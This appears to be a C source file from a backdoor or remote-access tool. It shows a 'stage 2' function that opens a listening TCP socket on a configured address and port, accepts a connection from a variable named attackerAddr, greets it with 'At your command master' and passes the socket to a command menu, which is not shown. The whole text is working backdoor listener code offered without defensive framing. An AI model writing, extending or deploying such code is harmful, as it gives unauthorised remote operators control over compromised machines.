#include "headers.h"
#include <stdio.h>
#include <string.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <errno.h>



int openPort(){
        printf("[*] stage 2\n");

        int server_fd, valread;
        struct sockaddr_in address; //
        
        int RUN = 1;
        
        
        char *hello = "At your command master";
        const char *my_ip = TARGET_IP;

        memset(&address, 0, sizeof(address));
        


        if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) { 
                perror("socket failed");
                return 1;
        }
        
        

        address.sin_family = AF_INET;
        address.sin_port = htons(TARGET_PORT);

        if (inet_pton(AF_INET, my_ip, &address.sin_addr) <= 0) {
                perror("inet_pton failed");
                return 1;
        }
        
        //------------------------------------------------------

        if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) < 0) {
            if(errno == EADDRINUSE){
                printf("socket in use\n");
                close(server_fd);
            }
            else{
                perror("bind failed");
                return 1;
            }
        }
        
        printf("Server bound to %s:%d\n", my_ip, TARGET_PORT );

        if (listen(server_fd, 1) < 0) {
                perror("listen failed");
                return 1;
        }
        printf("Waiting for connection...\n");


        struct sockaddr_in attackerAddr;
        int attackerLen, connID;
        attackerLen = sizeof(attackerAddr);

        connID = accept(server_fd, (struct sockaddr *)&attackerAddr, (socklen_t *)&attackerLen);
        if (connID < 0) {
              perror("accept failed");
              RUN = 0;
              return 1;
        }

        char client_ip_str[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &attackerAddr.sin_addr, client_ip_str, INET_ADDRSTRLEN);
        printf("Connection established with %s:%d. Waiting for message...\n", client_ip_str, ntohs(attackerAddr.sin_port));
        
        
        send(connID, hello, strlen(hello), 0);
        
        mainMenu(connID);
        
        close(connID);
        close(server_fd);
        
        return 0;
}
